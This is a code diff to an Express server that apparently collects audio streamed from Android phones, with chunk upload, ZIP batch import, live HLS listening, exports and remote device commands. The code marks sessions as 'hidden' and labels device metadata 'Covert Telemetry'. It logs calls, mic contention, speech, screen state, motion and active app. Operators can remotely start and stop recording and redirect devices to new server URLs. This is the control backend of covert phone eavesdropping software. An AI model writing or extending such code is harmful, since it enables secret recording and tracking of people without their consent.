@@ -15,9 +15,10 @@ import { v4 as uuidv4 } from 'uuid';
 import fs from 'fs';
 import path from 'path';
 import archiver from 'archiver';
+import AdmZip from 'adm-zip';
 import * as db from '../database';
 import * as storage from '../storage';
-import { appendToHLS, finalizeHLS } from '../hls';
+import { appendToHLS, finalizeHLS, hasActiveHlsListener } from '../hls';
 import { sendDeviceCommand, broadcastLiveEvent } from '../websocket';
 import { MAX_UPLOAD_SIZE, CHUNK_DURATION_MS, PUBLIC_DIR } from '../config';
 
@@ -92,8 +93,8 @@ router.post('/:session_id/chunk', upload.single('audio'), async (req: Request, r
         let session = db.getSession(session_id);
         if (!session) {
             storage.createSessionDirs(session_id);
-            const clientName = (req.body && req.body.client_name) 
-                || (db.getAllDeviceCommands()[0]?.client_id) 
+            const clientName = (req.body && req.body.client_name)
+                || (db.getAllDeviceCommands()[0]?.client_id)
                 || 'Realme-RMX2040';
             const streamType = req.body?.stream_type === 'main' ? 'main' : 'hidden';
             session = db.createSession(
@@ -109,6 +110,31 @@ router.post('/:session_id/chunk', upload.single('audio'), async (req: Request, r
             console.log(`[broadcast] Reactivated ended session to live on chunk ingest: ${session_id}`);
         }
 
+        // Parse optional metadata from request body
+        const chunkId = req.body.chunk_id || uuidv4();
+        const durationMs = parseInt(req.body.duration_ms || String(CHUNK_DURATION_MS), 10);
+        const checksum = req.body.checksum || '';
+        const inCall = req.body.in_call === '1' || req.body.in_call === 'true' ? 1 : 0;
+        const micInUse = req.body.mic_in_use === '1' || req.body.mic_in_use === 'true' ? 1 : 0;
+        const clientTimestamp = req.body.timestamp;
+
+        // Duplicate detection by chunk_id: if chunk was already uploaded, return 'already_exists' immediately
+        if (req.body.chunk_id) {
+            const existingChunk = db.getChunk(chunkId);
+            if (existingChunk) {
+                console.log(`[broadcast] Duplicate chunk skipped (chunk_id exists): session=${existingChunk.session_id} seq=${existingChunk.sequence_num} chunk_id=${chunkId}`);
+                res.json({
+                    status: 'already_exists',
+                    session_id: existingChunk.session_id,
+                    chunk_id: existingChunk.chunk_id,
+                    sequence_num: existingChunk.sequence_num,
+                    file_size: existingChunk.file_size,
+                    message: 'Chunk already uploaded.',
+                });
+                return;
+            }
+        }
+
         // Get sequence number from body or auto-increment
         let sequenceNum: number;
         if (req.body.sequence_num !== undefined) {
@@ -119,43 +145,54 @@ router.post('/:session_id/chunk', upload.single('audio'), async (req: Request, r
 
         // Duplicate detection: if this sequence already uploaded, skip
         if (db.chunkExists(session_id, sequenceNum)) {
-            console.log(`[broadcast] Duplicate chunk skipped: session=${session_id} seq=${sequenceNum}`);
+            console.log(`[broadcast] Duplicate chunk skipped (seq exists): session=${session_id} seq=${sequenceNum}`);
             res.json({
                 status: 'already_exists',
                 session_id,
+                chunk_id: chunkId,
                 sequence_num: sequenceNum,
                 message: 'Chunk already uploaded.',
             });
             return;
         }
 
-        // Parse optional metadata from request body
-        const chunkId = req.body.chunk_id || uuidv4();
-        const durationMs = parseInt(req.body.duration_ms || String(CHUNK_DURATION_MS), 10);
-        const checksum = req.body.checksum || '';
-        const inCall = req.body.in_call === '1' || req.body.in_call === 'true' ? 1 : 0;
-        const micInUse = req.body.mic_in_use === '1' || req.body.mic_in_use === 'true' ? 1 : 0;
-        const clientTimestamp = req.body.timestamp;
-
         // Save chunk to disk
         const saved = storage.saveChunk(session_id, sequenceNum, file.buffer, file.originalname);
 
-        // Insert into database
-        const chunk = db.insertChunk(
-            chunkId,
-            session_id,
-            sequenceNum,
-            saved.filename,
-            saved.filepath,
-            saved.fileSize,
-            durationMs,
-            checksum,
-            inCall,
-            micInUse
-        );
+        // Insert into database (with race-condition / conflict safety)
+        let chunk: db.Chunk;
+        try {
+            chunk = db.insertChunk(
+                chunkId,
+                session_id,
+                sequenceNum,
+                saved.filename,
+                saved.filepath,
+                saved.fileSize,
+                durationMs,
+                checksum,
+                inCall,
+                micInUse
+            );
+        } catch (dbErr: any) {
+            if (dbErr.code === 'SQLITE_CONSTRAINT_UNIQUE' || (dbErr.message && dbErr.message.includes('UNIQUE constraint failed'))) {
+                console.warn(`[broadcast] Unique constraint conflict on chunk insert handled gracefully (session=${session_id}, seq=${sequenceNum}, chunkId=${chunkId}): ${dbErr.message}`);
+                const existing = db.getChunk(chunkId) || (db.chunkExists(session_id, sequenceNum) ? db.getSessionChunks(session_id).find(c => c.sequence_num === sequenceNum) : undefined);
+                res.json({
+                    status: 'already_exists',
+                    session_id: existing?.session_id || session_id,
+                    chunk_id: existing?.chunk_id || chunkId,
+                    sequence_num: existing?.sequence_num || sequenceNum,
+                    file_size: existing?.file_size || saved.fileSize,
+                    message: 'Chunk already uploaded.',
+                });
+                return;
+            }
+            throw dbErr;
+        }
 
         // Dynamically update device_info for Dashboard Session Lists (Covert Telemetry)
-        const metaMatch = file.originalname.match(/_B(-?\d+)_S(-?\d+)(?:_O([A-Z]{3}))?(?:_D([01]))?(?:_U([01]))?(?:_C([A-Z0-9]+))?(?:_R([A-Z0-9]+))?(?:_V([01]))?(?:_dB(\d+))?(?:_T(\d+))?(?:_M([01]))?(?:_P([A-Z]+))?(?:_A([A-Z0-9]+))?/);
+        const metaMatch = file.originalname.match(/_B(-?\d+)_S(-?\d+)(?:_O([A-Z]{3}))?(?:_D([01]))?(?:_U([01]))?(?:_C([A-Z0-9]+))?(?:_R([A-Z0-9]+))?(?:_V([01]))?(?:_dB(\d+))?(?:_T(\d+))?(?:_M([01]))?(?:_P([A-Z]+))?(?:_A([A-Z0-9]+))?(?:_SIL([01]))?/);
         if (metaMatch) {
             const battery = metaMatch[1];
             const routeCode = metaMatch[3];
@@ -169,6 +206,7 @@ router.post('/:session_id/chunk', upload.single('audio'), async (req: Request, r
             const motionCode = metaMatch[11];
             const postureCode = metaMatch[12];
             const appCode = metaMatch[13];
+            const silCode = metaMatch[14];
 
             const session = db.getSession(session_id);
             if (session) {
@@ -201,6 +239,8 @@ router.post('/:session_id/chunk', upload.single('audio'), async (req: Request, r
                     let audioStr = '';
                     if (speechCode === '1') {
                         audioStr = ` | 🗣️ Speech (${dbVal || 0}dB)`;
+                    } else if (silCode === '1') {
+                        audioStr = ` | 🤫 Silent (${dbVal || 0}dB)`;
                     }
 
                     let tempStr = tempVal && parseInt(tempVal) > 0 ? ` | 🌡️ ${tempVal}°C` : '';
@@ -219,7 +259,13 @@ router.post('/:session_id/chunk', upload.single('audio'), async (req: Request, r
                         else appStr = ` | 📞 Call (${appCode.replace(/^A/, '')})`;
                     }
 
-                    const newDeviceInfo = `${baseInfo} | 🔋 ${battery}%${powerStr}${routeStr}${screenStr}${ringerStr}${audioStr}${tempStr}${motionStr}${postureStr}${appStr}`;
+                    let mnStr = '';
+                    const mnMatch = file.originalname.match(/_MN([01])/);
+                    if (mnMatch && mnMatch[1] === '1') {
+                        mnStr = ' | 🔴 Main UI Active';
+                    }
+
+                    const newDeviceInfo = `${baseInfo} | 🔋 ${battery}%${powerStr}${routeStr}${screenStr}${ringerStr}${audioStr}${tempStr}${motionStr}${postureStr}${appStr}${mnStr}`;
                     db.updateSessionDeviceInfo(session_id, newDeviceInfo);
                 } else {
                     // Standard / Main stream — keep simple
@@ -235,10 +281,12 @@ router.post('/:session_id/chunk', upload.single('audio'), async (req: Request, r
 
         console.log(`[broadcast] Chunk saved: session=${session_id} seq=${sequenceNum} call=${inCall} micUse=${micInUse}`);
 
-        // Generate HLS segment (async — don't block response)
-        appendToHLS(session_id, saved.filepath, sequenceNum, clientTimestamp, durationMs).catch(err => {
-            console.error(`[broadcast] HLS generation failed for seq ${sequenceNum}:`, err);
-        });
+        // On-demand HLS: only run FFmpeg if an active listener is streaming
+        if (hasActiveHlsListener(session_id)) {
+            appendToHLS(session_id, saved.filepath, sequenceNum, clientTimestamp, durationMs).catch(err => {
+                console.error(`[broadcast] HLS generation failed for seq ${sequenceNum}:`, err);
+            });
+        }
 
         res.json({
             status: 'confirmed',
@@ -249,7 +297,118 @@ router.post('/:session_id/chunk', upload.single('audio'), async (req: Request, r
             message: 'Chunk uploaded successfully. You may delete the local copy.',
         });
     } catch (err: any) {
+        if (err.code === 'SQLITE_CONSTRAINT_UNIQUE' || (err.message && err.message.includes('UNIQUE constraint failed'))) {
+            console.warn(`[broadcast] Outer caught unique constraint: ${err.message}. Returning already_exists (HTTP 200).`);
+            res.status(200).json({
+                status: 'already_exists',
+                session_id: req.params.session_id,
+                chunk_id: req.body?.chunk_id,
+                message: 'Chunk already uploaded.',
+            });
+            return;
+        }
         console.error('[broadcast] Upload chunk error:', err);
+        res.status(500).json({ status: 'error', message: err.message });
+    }
+});
+
+/**
+ * POST /api/v1/broadcasts/:session_id/upload-zip
+ * Batch upload of offline audio chunks packaged as a single ZIP archive.
+ */
+router.post('/:session_id/upload-zip', upload.single('file'), async (req: Request, res: Response) => {
+    try {
+        const session_id = req.params.session_id as string;
+        const file = req.file;
+
+        if (!file) {
+            res.status(400).json({ status: 'error', message: 'No zip file provided' });
+            return;
+        }
+
+        // Verify session exists or auto-recover if missing
+        let session = db.getSession(session_id);
+        if (!session) {
+            storage.createSessionDirs(session_id);
+            const clientName = (req.body && req.body.client_name)
+                || (db.getAllDeviceCommands()[0]?.client_id)
+                || 'Realme-RMX2040';
+            const streamType = req.body?.stream_type === 'main' ? 'main' : 'hidden';
+            session = db.createSession(
+                session_id,
+                clientName,
+                'Android Device (Live)',
+                streamType === 'main' ? `Main Recording - ${clientName}` : `Live Stream - ${clientName}`,
+                streamType
+            );
+            console.log(`[broadcast] Auto-recovered session for batch zip: ${session_id}`);
+        } else if (session.status !== 'live') {
+            db.reactivateSession(session_id);
+        }
+
+        const zip = new AdmZip(file.buffer);
+        const batchChunks: db.BatchChunkInput[] = [];
+        let currentMaxSeq = db.getLatestChunkSequence(session_id);
+
+        function processZipEntries(entries: AdmZip.IZipEntry[]) {
+            for (const entry of entries) {
+                if (entry.isDirectory) continue;
+                const basename = path.basename(entry.entryName);
+                if (basename.startsWith('.') || basename.startsWith('__MACOSX')) continue;
+
+                // Handle nested ZIP files (e.g. Master ZIP containing sub-ZIP bundles)
+                if (basename.toLowerCase().endsWith('.zip')) {
+                    try {
+                        const nestedZip = new AdmZip(entry.getData());
+                        processZipEntries(nestedZip.getEntries());
+                    } catch (nestedErr: any) {
+                        console.error(`[broadcast] Failed to process nested zip ${basename}:`, nestedErr.message);
+                    }
+                    continue;
+                }
+
+                const buffer = entry.getData();
+                if (buffer.length === 0) continue;
+
+                currentMaxSeq++;
+                const sequenceNum = currentMaxSeq;
+
+                const saved = storage.saveChunk(session_id, sequenceNum, buffer, basename);
+
+                const chunkIdMatch = basename.match(/^([a-f0-9-]{36})/i);
+                const chunkId = chunkIdMatch ? chunkIdMatch[1] : uuidv4();
+
+                const inCall = basename.includes('_C1') || basename.includes('ACELL') || basename.includes('AWA') ? 1 : 0;
+                const micInUse = basename.includes('_U1') ? 1 : 0;
+
+                batchChunks.push({
+                    chunkId,
+                    sequenceNum,
+                    filename: saved.filename,
+                    filepath: saved.filepath,
+                    fileSize: saved.fileSize,
+                    durationMs: CHUNK_DURATION_MS,
+                    inCall,
+                    micInUse
+                });
+            }
+        }
+
+        processZipEntries(zip.getEntries());
+
+        const { insertedCount } = db.insertChunksBatch(session_id, batchChunks);
+
+        console.log(`[broadcast] Batch ZIP processed: session=${session_id}, extracted=${batchChunks.length}, inserted=${insertedCount}`);
+
+        res.json({
+            status: 'confirmed',
+            session_id,
+            chunks_processed: batchChunks.length,
+            chunks_inserted: insertedCount,
+            message: 'Batch chunks imported successfully.'
+        });
+    } catch (err: any) {
+        console.error('[broadcast] Batch ZIP upload error:', err);
         res.status(500).json({ status: 'error', message: err.message });
     }
 });
@@ -326,10 +485,10 @@ function parseChunkTelemetry(filename: string, chunk: db.Chunk): DecodedTelemetr
         }
 
         const powerCode = metaMatch[6];
-        if (powerCode === 'CAC' || powerCode === 'AC') powerSource = 'Wall AC Fast Charger';
-        else if (powerCode === 'CUSB' || powerCode === 'USB') powerSource = 'PC / USB Cable';
-        else if (powerCode === 'CWIR' || powerCode === 'WIR') powerSource = 'Wireless Charging';
-        else if (powerCode === 'CBAT' || powerCode === 'BAT') powerSource = 'Battery (Unplugged)';
+        if (powerCode === 'CAC') powerSource = 'Wall AC Fast Charger';
+        else if (powerCode === 'CUSB') powerSource = 'PC / USB Cable';
+        else if (powerCode === 'CWIR') powerSource = 'Wireless Charging';
+        else if (powerCode === 'CBAT') powerSource = 'Battery (Unplugged)';
 
         const ringerCode = metaMatch[7];
         if (ringerCode === 'RS') ringerMode = 'Silent';
@@ -431,113 +590,6 @@ router.all('/batch-export-zip', exportRateLimit, async (req: Request, res: Respo
             const rawDir = storage.getRawDir(sessionId);
             const resolvedRawDir = path.resolve(rawDir);
 
-            // Decode telemetry for every chunk
-            const telemetryList: DecodedTelemetry[] = chunks.map(c => parseChunkTelemetry(c.filename, c));
-
-            // Compute summary statistics
-            const batteries = telemetryList.map(t => t.batteryPercent).filter((b): b is number => b !== null);
-            const startBattery = batteries.length > 0 ? `${batteries[0]}%` : 'Unknown';
-            const endBattery = batteries.length > 0 ? `${batteries[batteries.length - 1]}%` : 'Unknown';
-            const avgBattery = batteries.length > 0 ? `${Math.round(batteries.reduce((a, b) => a + b, 0) / batteries.length)}%` : 'Unknown';
-            const dBs = telemetryList.map(t => t.decibels).filter((d): d is number => d !== null);
-            const avgDecibels = dBs.length > 0 ? `${Math.round(dBs.reduce((a, b) => a + b, 0) / dBs.length)} dB` : 'N/A';
-            const temps = telemetryList.map(t => t.temperatureC).filter((t): t is number => t !== null);
-            const tempRange = temps.length > 0 ? `${Math.min(...temps)}°C - ${Math.max(...temps)}°C` : 'N/A';
-            const powerSources = [...new Set(telemetryList.map(t => t.powerSource))].join(', ') || 'Battery';
-            const callsCount = telemetryList.filter(t => t.inCall).length;
-            const micInUseCount = telemetryList.filter(t => t.micInUse).length;
-
-            // Retrieve device installation record if available
-            const installs = db.getDeviceInstalls(100);
-            const installInfo = installs.find(i => i.client_id === session.client_name);
-
-            // 1. Generate human-readable SESSION_REPORT.txt
-            const reportText = `================================================================================
-📡 AUDIO STREAM PRO RECORDING & TELEMETRY REPORT
-================================================================================
-Session ID       : ${session.session_id}
-Device Name      : ${session.client_name || 'Unknown Device'}
-Device Info      : ${session.device_info || 'Mobile Audio Client'}
-Stream Type      : ${session.stream_type.toUpperCase()}
-Created (IST)    : ${toISTString(session.created_at)}
-Ended (IST)      : ${session.ended_at ? toISTString(session.ended_at) : 'Active / Still Open'}
-Total Duration   : ${Math.floor(session.total_duration / 60)}m ${Math.floor(session.total_duration % 60)}s (${session.total_duration.toFixed(1)}s)
-Total Chunks     : ${chunks.length}
-Total Audio Size : ${(session.total_bytes / (1024 * 1024)).toFixed(2)} MB (${session.total_bytes.toLocaleString()} bytes)
-
---------------------------------------------------------------------------------
-📱 DEVICE SPECIFICATIONS (From Registration)
---------------------------------------------------------------------------------
-Model            : ${installInfo?.device_model || session.device_info || 'Unknown'}
-Manufacturer     : ${installInfo?.manufacturer || 'Unknown'}
-Android / OS     : ${installInfo?.os_version || 'Unknown'}
-App Version      : ${installInfo?.app_version || 'Latest'}
-IP Address       : ${installInfo?.ip_address || 'Local / Cellular'}
-Registration Date: ${installInfo?.installed_at ? toISTString(installInfo.installed_at) : 'N/A'}
-
---------------------------------------------------------------------------------
-🔋 BATTERY & HARDWARE SENSORS SUMMARY
---------------------------------------------------------------------------------
-Start Battery    : ${startBattery}
-End Battery      : ${endBattery}
-Average Battery  : ${avgBattery}
-Power States     : ${powerSources}
-Call Detections  : ${callsCount > 0 ? `Active Call during ${callsCount} chunks` : 'No Phone Calls Detected'}
-Mic Interference : ${micInUseCount > 0 ? `Microphone contested during ${micInUseCount} chunks` : 'Clear exclusive recording'}
-Average Decibels : ${avgDecibels}
-Temperature      : ${tempRange}
-
-================================================================================
-Exported with Audio Stream Pro Downloader on ${toISTString(new Date().toISOString())}
-================================================================================
-`;
-            archive.append(reportText, { name: `${folderName}/SESSION_REPORT.txt` });
-
-            // 2. Generate granular telemetry_timeline.csv
-            const csvRows = [
-                'Sequence,Filename,Duration_Ms,Timestamp_IST,Timestamp_UTC,Battery_Pct,Power_Source,In_Call,Mic_In_Use,Speech_Detected,Decibels_dB,Temp_C,Screen_State,Motion,Posture,Active_App'
-            ];
-            for (const t of telemetryList) {
-                csvRows.push([
-                    t.sequenceNum,
-                    `"${t.filename}"`,
-                    t.durationMs,
-                    `"${t.receivedAtIST}"`,
-                    `"${t.receivedAtUTC}"`,
-                    t.batteryPercent !== null ? t.batteryPercent : '',
-                    `"${t.powerSource}"`,
-                    t.inCall ? '1' : '0',
-                    t.micInUse ? '1' : '0',
-                    t.speechDetected ? '1' : '0',
-                    t.decibels !== null ? t.decibels : '',
-                    t.temperatureC !== null ? t.temperatureC : '',
-                    `"${t.screenState}"`,
-                    `"${t.motion}"`,
-                    `"${t.posture}"`,
-                    `"${t.activeApp}"`
-                ].join(','));
-            }
-            archive.append(csvRows.join('\r\n'), { name: `${folderName}/telemetry_timeline.csv` });
-
-            // 3. Generate structured metadata.json
-            const metadataObj = {
-                session,
-                install: installInfo || null,
-                telemetry_summary: {
-                    start_battery: startBattery,
-                    end_battery: endBattery,
-                    avg_battery: avgBattery,
-                    power_sources: powerSources,
-                    calls_count: callsCount,
-                    mic_in_use_count: micInUseCount,
-                    avg_decibels: avgDecibels,
-                    temperature_range: tempRange
-                },
-                chunks: telemetryList
-            };
-            archive.append(JSON.stringify(metadataObj, null, 2), { name: `${folderName}/metadata.json` });
-
-            // 4. Append Audio Chunks or Merged Audio
             const chunkFiles = chunks
                 .map(c => path.resolve(c.filepath))
                 .filter(filePath =>
@@ -545,25 +597,30 @@ Exported with Audio Stream Pro Downloader on ${toISTString(new Date().toISOStrin
                     && fs.existsSync(filePath)
                 );
 
+            if (chunkFiles.length === 0) {
+                archive.append(`No audio recordings found on disk for session ${sessionId}.\n`, {
+                    name: `${folderName}/empty_session.txt`
+                });
+                continue;
+            }
+
             if (formatParam === 'audio') {
                 // Merge all raw chunks into single continuous stream/file
-                if (chunkFiles.length > 0) {
-                    const buffers: Buffer[] = [];
-                    for (const fp of chunkFiles) {
-                        try {
-                            buffers.push(fs.readFileSync(fp));
-                        } catch { }
-                    }
-                    if (buffers.length > 0) {
-                        const mergedBuffer = Buffer.concat(buffers);
-                        const ext = path.extname(chunkFiles[0]) || '.aac';
-                        archive.append(mergedBuffer, { name: `${folderName}/${cleanClient}_full_audio${ext}` });
-                    }
+                const buffers: Buffer[] = [];
+                for (const fp of chunkFiles) {
+                    try {
+                        buffers.push(fs.readFileSync(fp));
+                    } catch { }
+                }
+                if (buffers.length > 0) {
+                    const mergedBuffer = Buffer.concat(buffers);
+                    const ext = path.extname(chunkFiles[0]) || '.aac';
+                    archive.append(mergedBuffer, { name: `${folderName}/${cleanClient}_full_audio${ext}` });
                 }
             } else {
-                // Pro chunks mode: include every individual raw chunk
+                // Simple audio chunks directly in the session folder
                 for (const filePath of chunkFiles) {
-                    archive.file(filePath, { name: `${folderName}/chunks/${path.basename(filePath)}` });
+                    archive.file(filePath, { name: `${folderName}/${path.basename(filePath)}` });
                 }
             }
         }
@@ -647,7 +704,7 @@ router.get('/:session_id/export-channel', exportRateLimit, (req: Request, res: R
             archive.finalize();
             return;
         }
-        
+
         if (formatParam === 'm3u8') {
             const filename = `${session.client_name || 'session'}_${session_id.slice(0, 8)}_${channelParam}.m3u8`;
             res.setHeader('Content-Type', 'audio/x-mpegurl');
@@ -661,7 +718,7 @@ router.get('/:session_id/export-channel', exportRateLimit, (req: Request, res: R
         const ext = isMP3 ? 'mp3' : 'aac';
         const contentType = isMP3 ? 'audio/mpeg' : 'audio/aac';
         const filename = `${session.client_name || 'session'}_${session_id.slice(0, 8)}_${channelParam}.${ext}`;
-        
+
         res.setHeader('Content-Type', contentType);
         res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
 
@@ -761,14 +818,27 @@ router.post('/remote-command', (req: Request, res: Response) => {
         db.setDeviceCommand(client_id, command);
         console.log(`[broadcast] Remote command set for ${client_id}: ${command}`);
 
+        const targetUrl = payload?.server_url || payload?.url || payload?.new_url || config?.server_url || req.body.url || req.body.server_url;
+        if (targetUrl && typeof targetUrl === 'string' && (targetUrl.startsWith('http://') || targetUrl.startsWith('https://'))) {
+            try {
+                db.saveDeviceConfig(client_id, { server_url: targetUrl.trim() });
+            } catch (e) {
+                console.error('[broadcast] Failed saving updated server_url to device config:', e);
+            }
+        }
+
         const extraData: Record<string, any> = {};
         if (payload) Object.assign(extraData, payload);
         if (enabled !== undefined) extraData.enabled = enabled;
         if (config !== undefined) extraData.config = config;
+        if (targetUrl) {
+            extraData.server_url = targetUrl.trim();
+            extraData.url = targetUrl.trim();
+        }
 
         // ⚡ Send instant push command through live WebSocket (0ms latency, WhatsApp style)
         const pushedViaSocket = sendDeviceCommand(client_id, command, extraData);
-        
+
         res.json({
             status: 'success',
             client_id,
@@ -862,24 +932,16 @@ router.get('/command', (req: Request, res: Response) => {
 
         const cmd = db.getDeviceCommand(client_id);
         const commandStr = cmd ? cmd.command : 'NONE';
-        const autoScreenshot = cmd ? cmd.auto_screenshot : 0;
-        const screenshotInterval = cmd ? cmd.screenshot_interval : 30;
         const startTime = cmd ? (cmd.start_time || "") : "";
         const stopTime = cmd ? (cmd.stop_time || "") : "";
-        
+
         // Don't clear START/STOP commands here — wait for the APK to acknowledge via /command/ack
-        // Only clear transient one-shot commands that don't need reliability
-        if (commandStr === 'SCREENSHOT_NOW') {
-             db.clearDeviceCommand(client_id);
-             console.log(`[broadcast] Transient command consumed by ${client_id}: ${commandStr}`);
-        } else if (commandStr === 'START' || commandStr === 'STOP') {
-             console.log(`[broadcast] Command delivered to ${client_id}: ${commandStr} (awaiting ACK)`);
+        if (commandStr === 'START' || commandStr === 'STOP') {
+            console.log(`[broadcast] Command delivered to ${client_id}: ${commandStr} (awaiting ACK)`);
         }
 
-        res.json({ 
+        res.json({
             command: commandStr,
-            auto_screenshot: autoScreenshot,
-            screenshot_interval: screenshotInterval,
             start_time: startTime,
             stop_time: stopTime
         });
@@ -896,33 +958,21 @@ router.post('/command/ack', (req: Request, res: Response) => {
             res.status(400).json({ status: 'error', message: 'Missing client_id or command' });
             return;
         }
-        
+
         // Only clear the command if it matches what the APK is acknowledging
         const current = db.getDeviceCommand(client_id);
         if (current && current.command === command) {
             db.clearDeviceCommand(client_id);
             console.log(`[broadcast] Command ACK received from ${client_id}: ${command}`);
         }
-        
+
         res.json({ status: 'acknowledged', client_id, command });
     } catch (err: any) {
         res.status(500).json({ status: 'error', message: err.message });
     }
 });
 
-router.post('/screenshot-settings', (req: Request, res: Response) => {
-    try {
-        const { client_id, auto_screenshot, interval } = req.body;
-        if (!client_id) {
-            res.status(400).json({ status: 'error', message: 'Missing client_id' });
-            return;
-        }
-        db.updateDeviceScreenshotSettings(client_id, auto_screenshot ? 1 : 0, interval || 30);
-        res.json({ status: 'success' });
-    } catch (err: any) {
-        res.status(500).json({ status: 'error', message: err.message });
-    }
-});
+
 
 router.post('/schedule', (req: Request, res: Response) => {
     try {
@@ -955,28 +1005,7 @@ router.post('/schedule', (req: Request, res: Response) => {
     }
 });
 
-router.post('/upload-screenshot', upload.single('image'), (req: Request, res: Response) => {
-    try {
-        const { client_id } = req.body;
-        if (!client_id) {
-            res.status(400).json({ status: 'error', message: 'Missing client_id' });
-            return;
-        }
-        if (!req.file) {
-            res.status(400).json({ status: 'error', message: 'Missing image file' });
-            return;
-        }
-        
-        const dir = path.join(PUBLIC_DIR, 'screenshots');
-        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
-        
-        fs.writeFileSync(path.join(dir, `${client_id}.jpg`), req.file.buffer);
-        
-        res.json({ status: 'success' });
-    } catch (err: any) {
-        res.status(500).json({ status: 'error', message: err.message });
-    }
-});
+
 
 // ════════════════════════════════════════════════════════════════════════════
 // APP INSTALL BEACON (Tracks when client APK is first installed / activated)
